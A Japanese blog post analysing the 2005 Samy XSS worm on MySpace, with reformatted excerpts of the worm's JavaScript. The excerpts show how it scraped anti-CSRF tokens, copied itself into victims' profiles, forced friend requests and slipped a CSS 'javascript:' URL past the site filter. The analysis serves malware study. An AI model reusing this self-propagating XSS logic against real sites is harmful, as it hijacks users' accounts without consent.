# XSSワーム「Samy」の動作を解析する

<p class="modest" align="left">Mar 1, 2018</p>

---

この記事はセキュリティ・キャンプWS「The Anatomy of Malware 完全版」の応募課題として提出したものである。公開にあたり一部文章の修正と図式の差し替えを行なった。

## Samyの誕生とそれによる被害

アメリカのハッカーであるSamy Kamkar氏（[@samykamkar](https://twitter.com/samykamkar)）が2005年にリリースしたMySpaceを標的とするXSSワームが「Samy（JS.Spacehero）」である。当時のソーシャル・ネットワーキング・サービスMySpaceは、プロフィールをユーザー好みのスタイルに設定できる仕様であり、一部のHTMLタグの使用が許可されていた。JavaScriptの実行につながるタグや属性などの使用は禁止されていたが、Kamkar氏はそのフィルター処理を回避できた<sup id="f1">[¹](#fn1)</sup>。当時19歳だったKamkar氏はこの抜け道を利用して友達を増やすためにSamyを開発した。

2005年10月4日にKamkar氏のプロフィールで公開されたSamyは、わずか20時間で100万人以上のMySpaceユーザーに感染した。このワームは最も急速に感染を広げたマルウェアと考えられており、XSSワームの起源にして頂点といえる。感染したユーザーはKamkar氏のアカウントへのフレンド申請を強制され、プロフィールのヒーロー欄に ` but most of all, samy is my hero.` との文言とペイロード（Samy自身）を書き込まれる。情報資産の窃取や金銭の要求などの悪質な行為は行なわれなかった。

## Samyの感染動作

今回は[Kamkar氏のサイト](https://samy.pl/popular/tech.html)に残されている[Samyのコード](https://gist.github.com/atsunoda/efe6970e522b6af9c0cdecea0fa251bf#file-samy)を整形し、[変数名を付与したコード](https://gist.github.com/atsunoda/efe6970e522b6af9c0cdecea0fa251bf#file-samy-js)を引用しながら感染動作を解析する。Samyのコードフローを図に示すと以下のようになる。

<p align="center"><img src="/assets/2018/analyzing_samy_xss_worm/samy's_activity.png" alt="samy's_activity"></p>

MySpaceのプロフィールは `profile.myspace.com` と `www.myspace.com` の両方のドメインから閲覧できる仕様だった。しかし編集は後者からしか行なえなかったため、最初にサブドメインを確認している。感染動作に利用するページとそのURLは以下である。

* プロフィールページ  
  hxxp://www[.]myspace.com/index.cfm?fuseaction=user.viewProfile
* プロフィール編集確認ページ  
  hxxp://www[.]myspace.com/index.cfm?fuseaction=profile.previewInterests
* プロフィール編集完了ページ  
  hxxp://www[.]myspace.com/index.cfm?fuseaction=profile.processInterests

コードフローと各ページのURLを把握した上で `main()` から読み解いていく。

### main()の動作

このコードが存在する（つまり感染済みの）プロフィールページを閲覧した被害者のIDを `getClientFID()` で取得する。その後 `httpSend()` でペイロードの書き込みを、 `httpSend2()` でフレンド申請を行なう。今回は感染動作に注目するため `httpSend()` の処理を追う。

```js
function main() {
  var AN_clientFID = getClientFID();
  var BH_uri = '/index.cfm?fuseaction=user.viewProfile&friendID=' + AN_clientFID + '&Mytoken=' + L_myToken;
  J_xmlhttp1 = getXMLObj();
  httpSend(BH_uri, getHome, 'GET');
  xmlhttp2 = getXMLObj();
  httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken=' + L_myToken, processxForm, 'GET')
}
```

### httpSend()の動作

感染動作に利用するページへの通信は全てこの関数から行なわれる。`evil()` 内の `onreadystatechange` イベントから実行される `getHome()` でプロフィール編集確認ページとの通信を、`postHero()` でプロフィール編集完了ページとの通信を行なう。

まず被害者のプロフィールページをGETする。通信状態（readyState）が変わるたびにイベントが発生し、通信が終了すると `getHome()` の処理に進む。

```js
function httpSend(BH_uri, BI_function, BJ_method, BK_contents) {
  if (!J_xmlhttp1) {
    return false
  }
  eval('J_xmlhttp1.onr' + 'eadystatechange=BI_function');
  J_xmlhttp1.open(BJ_method, BH_uri, true);
  if (BJ_method == 'POST') {
    J_xmlhttp1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    J_xmlhttp1.setRequestHeader('Content-Length', BK_contents.length)
  }
  J_xmlhttp1.send(BK_contents);
  return true
}
```

### getHome()の動作

GETしたプロフィールページのレスポンスを解析し、ヒーロー欄に `samy` の文字が含まれているか確認する。含まれている場合は既に感染済みと判断し、感染動作は終了する。含まれていない場合はペイロードを搭載したリクエストを組み立て、プロフィール編集確認ページにPOSTする。その通信が終了すると `postHero()` の処理に進む。

```js
function getHome() {
  if (J_xmlhttp1.readyState != 4) {
    return
  }
  var AU_responseHTML = J_xmlhttp1.responseText;
  AG_heroes = findIn(AU_responseHTML, 'P' + 'rofileHeroes', '</td>');
  AG_heroes = AG_heroes.substring(61, AG_heroes.length);
  if (AG_heroes.indexOf('samy') == -1) {
    if (AF_payload) {
      AG_heroes += AF_payload;
      var AR_myToken = getFromURL(AU_responseHTML, 'Mytoken');
      var AS_params = new Array();
      AS_params['interestLabel'] = 'heroes';
      AS_params['submit'] = 'Preview';
      AS_params['interest'] = AG_heroes;
      J_xmlhttp1 = getXMLObj();
      httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken=' + AR_myToken, postHero, 'POST', paramsToString(AS_params))
    }
  }
}
```

### AF_payloadの生成

ペイロードを生成する処理は以下である。このコードが存在するページのHTMLを取得し、そこからペイロードに再利用する文字列を抽出する。この処理でSamy自身を複製している。

```js
var AA_selfHTML = g_getSelfHTML();
var AB_indexHeadOfSelfPayload = AA_selfHTML.indexOf('m' + 'ycode');
var AC_string = AA_selfHTML.substring(AB_indexHeadOfSelfPayload, AB_indexHeadOfSelfPayload + 4096);  // Length of unformatted self code is 4015.
var AD_indexTailOfSelfPayload = AC_string.indexOf('D' + 'IV');
var AE_selfPayload = AC_string.substring(0, AD_indexTailOfSelfPayload);
var AF_payload;
if (AE_selfPayload) {
  AE_selfPayload = AE_selfPayload.replace('jav' + 'a', A_singleQuote + 'jav' + 'a');
  AE_selfPayload = AE_selfPayload.replace('exp' + 'r)', 'exp' + 'r)' + A_singleQuote);
  AF_payload = ' but most of all, samy is my hero. <d' + 'iv id=' + AE_selfPayload + 'D' + 'IV>'
}
var AG_heroes;
```

抽出した文字列の二箇所に `'` を追加する処理がある。IE6のDOMから `createTextRange()` や `innerHTML` によって生成されたHTMLでは、Style属性値内の引用符が削除されることから、もとの状態に戻すための処理だと考える<sup id="f2">[²](#fn2)</sup>。これによりCSS構文は以下のように修正される。

```diff
-BACKGROUND: url(java 
-script:eval(document.all.mycode.expr))
+BACKGROUND: url('java 
+script:eval(document.all.mycode.expr)')
```

### postHero()の動作

最後にペイロードを搭載したリクエストをプロフィール編集完了ページにPOSTする。リクエストには確認ページから抽出したCSRF対策トークン `hash` も含めている。

```js
function postHero() {
  if (J_xmlhttp1.readyState != 4) {
    return
  }
  var AU_responseHTML = J_xmlhttp1.responseText;
  var AR_myToken = getFromURL(AU_responseHTML, 'Mytoken');
  var AS_params = new Array();
  AS_params['interestLabel'] = 'heroes';
  AS_params['submit'] = 'Submit';
  AS_params['interest'] = AG_heroes;
  AS_params['hash'] = getHiddenParameter(AU_responseHTML, 'hash');
  httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken=' + AR_myToken, nothing, 'POST', paramsToString(AS_params))
}
```

これにより被害者のプロフィールにペイロードが書き込まれる。そのプロフィールを閲覧したユーザーのブラウザ上でもJavaScriptが実行し、そのユーザーのプロフィールにもペイロードが書き込まれる。この繰り返しがSamyの感染動作である。

## 所感

Samyの終息後も[Twitter](https://www.mcafee.com/japan/security/virT.asp?v=JS/Twettir)や[Facebook](https://www.symantec.com/connect/blogs/new-xss-facebook-worm-allows-automatic-wall-posts)などでXSSワームの被害が発生している。今後は仮想通貨のマイニングを目的としたXSSワームがリリースされることも予想される。利用者の多いSNSでXSSワームがリリースされれば多数のユーザーに感染し、被害者のPCリソースは仮想通貨のマイニングに使われる。これを狙う攻撃者（個人、組織、国家）は少なくないだろう。新種のXSSワームのリリースに備えるためにも、起源であるSamyを解析して感染動作を理解したいと考えた。

当時のMySpaceのプロフィール編集やフレンド申請は単純な処理だったが、現在のSNSではこれより複雑になっている。またCSPの導入やブラウザの保護機能によりXSSの悪用も難しくなっている。これを機に現在のSNSを標的としたXSSワームの現実的な脅威を考えていきたい。XSSの脆弱性があったと仮定して、どのようにJavaScriptを実装すれば感染動作を実現できるのか、また攻撃者の利益になるのかを考えることも重要だ。

今回の解析ではコードの整形と可視化のためにVisual Studioを、JavaScriptのデバッグのためにIE6とFirefoxを、HTTP通信の取得のためにBurp Suiteを使用した。Samyのコードは圧縮処理を除いて難読化は施されていなかった。しかしXSSワームを含む現代のJavaScriptマルウェアは高度な難読化が施されているため、[JSDetox](http://relentless-coding.org/projects/jsdetox/)などを使用したJavaScriptの解析技術が求められる。難読化されたJavaScriptマルウェアの解析方法も機会があれば調査してまとめたい。

---

<sup id="fn1">[¹](#f1)</sup> 当時のIEとSafariのみで解釈される特殊なCSS構文を使用することで、フィルター処理を回避してJavaScriptを実行した。この詳細は[Kamkar氏のサイト](https://samy.pl/popular/tech.html)やOWASP & WASC AppSec 2007の「[The MySpace Worm](https://www.owasp.org/images/7/79/OWASP-WASCAppSec2007SanJose_SamyWorm.ppt)」で解説されている。  
<sup id="fn2">[²](#f2)</sup> IE6では `url()` への引数を引用符で括らなくても正常に動作したことから、IE5以前への対処だと考える。[Kamkar氏へのインタビュー](http://blogoscoped.com/archive/2005-10-14-n81.html)のなかで「私のSafariでは動かなかったが、驚くことに古いバージョンを使っていた彼女は感染した」と語っているように、Kamkar氏はSafariユーザーを標的として考えていなかった。
